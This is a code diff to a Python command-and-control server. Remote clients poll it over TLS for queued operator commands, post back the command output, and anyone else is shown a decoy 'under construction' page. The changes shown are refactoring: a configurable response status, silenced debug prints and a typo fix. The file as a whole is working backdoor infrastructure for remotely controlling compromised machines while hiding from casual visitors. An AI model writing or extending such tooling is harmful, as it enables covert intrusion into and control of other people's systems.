@@ -46,8 +46,8 @@ def deq(qu, timeout=None):
         return None
 
 # expects all input to be utf-8 strings
-def build_response(headers, payload):
-    res = "HTTP/1.1 200 OK\r\n"
+def build_response(headers, payload, response_type="200 OK"):
+    res = "HTTP/1.1 {}\r\n".format(response_type)
 
     if len(payload):
         headers["Content-Length"] = len(payload)        
@@ -59,72 +59,53 @@ def build_response(headers, payload):
     res += payload
     return res.encode("utf-8")
 
-"""
-def parse_headers(header_bytes):
-    header_str = header_bytes.decode("utf-8")
-    header_lines = header_bytes.split(b"\r\n")
-    headers = {}
-    for line in header_lines:
-        key_and_value = line.split(b":", 1)
-
-        if len(key_and_value) < 2: # invalid header
-            continue
-
-        key = key_and_value[0]
-        value = key_and_value[1]
-        headers[key] = value
-
-    return headers
-"""
 # don't bother with type checking, if there is a parsing problem then just hit them with a 400
 def parse_headers(header_bytes):
     headers = {}
     header_str = header_bytes.decode("utf-8")
+
     for line in header_str.splitlines():
         key_and_value = line.split(":", 1)
+        
         if len(key_and_value) < 2:
             continue
+        
         key, value = key_and_value
         headers[key.lower()] = value.strip()
+    
     return headers
    
 # Interact with client
 def handle_client(conn, source):
     try:
         received = conn.recv() # receive first chunk
-    
-        #print(received)
+
+        # split head section and body section
         head_and_body = received.split(b"\r\n\r\n", 1)
         head = head_and_body[0]
         body = head_and_body[1] or b""
 
+        # parse headers
         headers = parse_headers(head)
+        
+        # Look for Content-Length header
         content_length_str = headers.get("content-length")
-
-        #  Look for Content-Length header
+        
         if content_length_str:
             content_length = int(content_length_str)
 
-            print("Content-Length parsed: {}".format(content_length))
+            #print("Content-Length parsed: {}".format(content_length))
 
+            # Acquire missing HTTP content from socket
             while len(body) < content_length:
-                print("[!] Acquiring another chunk")
                 chunk = conn.recv()
                 if not chunk:
-                    print("[!] Received data unequal Content-Length")
+                    print("[!] Received data != Content-Length")
                     break
                 body += chunk
-                #received += chunk
 
         # Client asks for commands
         if received.startswith(heartbeat_get):
-            """
-            # ToDo: build proper session management and separate clients
-            if source[0] not in active_clients:
-                active_clients.add(source[0])
-                output_queue.put(json.dumps({ "output": "[!] New client connected:" + source[0]}))
-            """
-
             command = deq(command_queue) # get command from queue or <None>
 
             response_headers = {
@@ -135,20 +116,14 @@ def handle_client(conn, source):
             # Pack as json. <None> gets turned into <null> automatically
             response_payload = { "com" : command } 
             response_body = json.dumps(response_payload)
-
-            conn.write(build_response(response_headers, response_body))
+ 
+            conn.write(build_response(headers=response_headers, payload=response_body))
             conn.close()
             return
 
         # Client returns command response
         if received.startswith(response_post):
-            """
-            head_body = received.split(b"\r\n\r\n", 1)
-            if len(head_body) > 1:
-                body = head_body[1]
-                output_queue.put(body) # hand over command output to I/O loop
-            """
-            output_queue.put(body)
+            output_queue.put(body) # hand over command output to I/O loop
 
             # respond whatever
             response_headers = {
@@ -157,21 +132,21 @@ def handle_client(conn, source):
             }
             response_payload = "Sasquatch"
 
-            conn.write(build_response(response_headers, response_payload))
+            conn.write(build_response(headers=response_headers, payload=response_payload))
             conn.close()
             return
 
         # fob off unwanted guests
-        conn.write(build_response({"Content-Type": "text/plain; charset=utf-8", "Connection": "Closed"}, "This page is under construction."))
+        conn.write(build_response(headers={"Content-Type": "text/plain; charset=utf-8", "Connection": "Closed"}, payload="This page is under construction."))
         conn.close()
 
     except Exception as e:
-        print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
-        print(e)
+        #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
+        #print(e)
         if conn:
+            build_response(headers={"Connection": "Closed"}, payload="", response_type="400 Bad Request")
             conn.write(b"HTTP/1.1 400 Bad Request\r\nConnection: Closed\r\n\r\n")
             conn.close()
-
 
 # Create SSL/TLS context which we use to wrap all incoming connections
 context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
@@ -213,7 +188,7 @@ def figure_out_charset(input_bytes):
     for encoding in encodings:
         try:
             output = input_bytes.decode(encoding)
-            print("Detected: " + encoding)
+            #print("Detected: " + encoding)
             return output
         except:
             pass
@@ -251,7 +226,7 @@ try:
         # Hand over command to the network loop
         command_queue.put(user_input)
 
-        # wait a bit for a resonse
+        # wait a bit for a response
         response = deq(output_queue, response_timeout)
         if response:
             display_response(response)
